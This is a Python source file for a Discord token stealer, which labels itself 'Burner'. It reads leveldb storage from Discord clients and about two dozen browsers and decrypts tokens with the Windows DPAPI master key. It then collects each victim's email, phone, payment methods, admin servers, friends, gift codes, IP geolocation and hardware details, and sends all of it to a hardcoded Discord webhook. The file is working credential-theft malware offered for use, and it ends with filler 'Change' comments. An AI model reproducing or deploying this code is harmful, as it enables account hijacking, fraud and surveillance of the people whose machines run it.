import base64
import json
import os
import re

import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile

import psutil
from datetime import datetime
import requests
import getpass
import uuid
import socket
import time
import platform
import psutil
import datetime
import psutil
import GPUtil
import os
import re
import json
from urllib.request import Request, urlopen

import requests
from Cryptodome.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData

def get_uptime():
    boot_time = psutil.boot_time()
    current_time = datetime.datetime.now().timestamp() 
    uptime_seconds = current_time - boot_time
    uptime_hours = uptime_seconds / 3600
    uptime_days = uptime_hours / 24
    return uptime_hours, uptime_days

def send_info(user, pc_name, hwid, ip_address):
        Api1 = 'https://ipinfo.io/json?format=json&token=8d8303d1900bbe'
        response1 = requests.get(Api1)

Api1 = 'https://ipinfo.io/json?format=json&token=8d8303d1900bbe'
response1 = requests.get(Api1)
data1 = response1.json()

Api2 = "https://ipapi.co/json/"
response2 = requests.get(Api2)
data2 = response2.json()

usernamepc = getpass.getuser()
cpu_cores = psutil.cpu_count(logical=False)
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
windows_version = platform.platform()
gpus = GPUtil.getGPUs()
gpus = GPUtil.getGPUs()
gpu_type = gpus[0].name if gpus else "GPU information not available"
ram_size = psutil.virtual_memory().total // (1024 ** 3)
drive_type = psutil.disk_partitions(all=False)[0].fstype
hostnamepc = socket.gethostname()
uptime_hours, uptime_days = get_uptime()
ip = data1['ip']
coordinates = data1['loc']
ISP = data1['org']
timezone = data1['timezone']
country = data1['country']
disk_usage = psutil.disk_usage('/')
total_space = disk_usage.total
available_space = disk_usage.free
zip_code = data1['postal']
city = data1['city']
region = data1['region']


class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens, self.uids = [], []

        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            key_tmp = self.get_master_key(self.roaming+f'\\{_discord}\\Local State')
                            if not key_tmp:
                                continue

                            # Correctly indented
                            token = self.decrypt_val(
                                base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
                                key_tmp
                            )

                            if token and self.validate_token(token):
                                try:
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
                                except:
                                    continue


            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={
                                                   'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)


    def validate_token(self, token: str) -> bool:
        print(token)
        r = requests.get(self.base_url, headers={'Authorization': token})

        if r.status_code == 200:
            return True

        return False

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        try:
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except UnicodeDecodeError:
            return None


    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key


class upload_tokens:
    def __init__(self, webhook):
        self.tokens = extract_tokens().tokens
        self.webhook = SyncWebhook.from_url(webhook)
        self.upload()
        
    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:968704541946167357>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:968704542021652560>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "<:hypersquad_events:968704541774192693>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:968704541677723648>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:968704541501571133>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:968704541883261018>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:968704541874860082>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:968704542126510090>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "<:bug_hunter_2:968704541774217246>",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:968704541702905886>",
                "shift": 17,
                "ind": 131072
            },
            "ACTIVE_DEVELOPER": {
                "emoji": "<:active_dev:1137518879854305310>",
                "shift": 22,
                "ind": 4194304
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:988996447938674699>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "⌨",
                "shift": 20,
                "ind": 1048704
            },
        }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

    def upload(self):
        if not self.tokens:
            return

        for token in self.tokens:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get(
                'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get(
                'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            friends = requests.get(
                'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
            gift_codes = requests.get(
                'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            badges = ' '.join([flag[0]
                              for flag in self.calc_flags(user['public_flags'])])

            if user['premium_type'] == 0:
                nitro = 'Aucun'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'Aucun'

            if billing:
                payment_methods = []

                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('💳')

                    elif method['type'] == 2:
                        payment_methods.append("<:paypal:973417655627288666>")

                    else:
                        payment_methods.append('❓')

                payment_methods = ', '.join(payment_methods)

            else:
                payment_methods = None

            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = True if guild['permissions'] == '4398046511103' else False
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = "✅" if guild['owner'] else "❌"

                        invites = requests.get(
                            f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0:
                            invite = f"https://discord.gg/{invites[0]['code']}"
                        else:
                            invite = "https://youtu.be/dQw4w9WgXcQ"

                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"

                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                            break

                        hq_guilds.append(data)

                if len(hq_guilds) > 0:
                    hq_guilds = '\n'.join(hq_guilds)

                else:
                    hq_guilds = None

            else:
                hq_guilds = None

            if friends:
                hq_friends = []
                for friend in friends:
                    unprefered_flags = [64, 128, 256, 1048704]
                    inds = [flag[1] for flag in self.calc_flags(
                        friend['user']['public_flags'])[::-1]]
                    for flag in unprefered_flags:
                        inds.remove(flag) if flag in inds else None
                    if inds != []:
                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                            friend['user']['public_flags'])[::-1]])

                        data = f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`"

                        if len('\n'.join(hq_friends)) + len(data) >= 1024:
                            break

                        hq_friends.append(data)

                if len(hq_friends) > 0:
                    hq_friends = '\n'.join(hq_friends)

                else:
                    hq_friends = None

            else:
                hq_friends = None

            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']

                    data = f":gift: `{name}`\n:ticket: `{code}`"

                    if len('\n\n'.join(codes)) + len(data) >= 1024:
                        break

                    codes.append(data)

                if len(codes) > 0:
                    codes = '\n\n'.join(codes)

                else:
                    codes = None

            else:
                codes = None

            embed = Embed(title=f"{username} ({user_id})", color=0xff6430)
            embed.set_thumbnail(url=avatar)

            embed.add_field(name="<a:blackcrown:1137631513266102322> Token:",
                            value=f"```{token}```", inline=False)
            embed.add_field(
                name="<:nit:1137632658759897099> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:pinkboost:1137629362993242172> Badges:",
                            value=f"{badges if badges != '' else 'Aucun'}", inline=True)
            embed.add_field(name="<:bil:1137630421631389836> Paiement:",
                            value=f"{payment_methods if payment_methods != '' else 'Aucun'}", inline=True)
            embed.add_field(name="<:a2f:1137631976577306665> A2f:",
                            value=f"{mfa if mfa != '' else 'non'}", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.add_field(name="<:adrs:1137633493149569024> Email:",
                            value=f"{email if email != None else 'Aucun'}", inline=True)
            embed.add_field(name="<:number:1137633986114506812> Phone:",
                            value=f"{phone if phone != None else 'Aucun'}", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            if hq_guilds != None:
                embed.add_field(
                    name="<a:blackearth:1137626325218230312> HQ serveurs:", value=hq_guilds, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if hq_friends != None:
                embed.add_field(
                    name="<a:blackearth:1137626325218230312> HQ amis:", value=hq_friends, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if codes != None:
                embed.add_field(
                    name="<a:blackearth:1137626325218230312> Codes cadeaux:", value=codes, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.add_field(name = "<:wifinfo:1137539907783495820> Wifi infos:",
                            value=f"📡 Isp:\n{ISP}\n\n📶 Ip:\n{ip}", inline=False)

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.add_field(name = "💻 PC Infos:",
                            value=f"💽 Storage capacity:\n{total_space / (1024**3):.2f} GB\n\n💾 Remaining capacity:\n{available_space / (1024**3):.2f} GB\n\n💿 Storage type:\n{drive_type}\n\n🧔 PC name:\n{usernamepc}\n\n👾 PC hostname:\n{hostnamepc}\n\n🎫 MAC address:\n{mac_address}\n\n🤍CPU core count:\n{cpu_cores}\n\n⏲ PC uptime hours\n{uptime_hours}\n\n💫 RAM GB count:\n{ram_size}\n\n🎨GPU type:\n{gpu_type}\n\n🪟 Version of Windows:\n{windows_version}")

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.add_field(name="📍 Localisation:",
                            value=f"🌃 City:\n{city}\n\n🏳 Country:\n{country}\n\n🕐 Time zone:\n{timezone}\n\n🗺 Postal code:\n{zip_code}\n\n🏴 Region:\n{region}\n\n🌐 Coordinates (estimate):\n{coordinates}")

            embed.set_footer(text="Burner")

            self.webhook.send(embed=embed, username="Burner",
                              avatar_url="https://media.discordapp.net/attachments/1121071106728677397/1137512404104794112/image.png")
                              
class DiscordToken:
    def __init__(self, webhook):
        self.tokens = extract_tokens().tokens
        self.webhook = webhook
        self.upload_tokens()
        
if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1358164315504509078/PcyJ0TmNAyET9kiELgcxoBcD7yLOrdjYv9MEGtD2YsF9CsTlfY04rHXgSN0omlknZ-Yr"
    upload_tokens(webhook_url)
# Change 0 on 2021-02-01
# Change 1 on 2021-02-12
# Change 0 on 2021-02-16
# Change 0 on 2021-02-27
# Change 1 on 2021-02-27
# Change 2 on 2021-02-26
# Change 0 on 2021-03-01
# Change 0 on 2021-04-06
# Change 1 on 2021-04-13
# Change 0 on 2021-04-23
# Change 1 on 2021-04-27
# Change 0 on 2021-05-01
# Change 0 on 2021-05-08
# Change 0 on 2021-05-21
# Change 1 on 2021-05-21
# Change 0 on 2021-08-08
# Change 1 on 2021-08-08
# Change 1 on 2021-08-16
# Change 0 on 2021-08-23
# Change 1 on 2021-08-20
# Change 0 on 2021-08-24
# Change 1 on 2021-08-24
# Change 1 on 2021-09-17
# Change 2 on 2021-09-17
# Change 3 on 2021-09-17
# Change 3 on 2021-09-24
# Change 2 on 2021-11-02
# Change 1 on 2021-10-29
# Change 3 on 2021-11-09
# Change 0 on 2021-11-08
# Change 1 on 2021-11-29
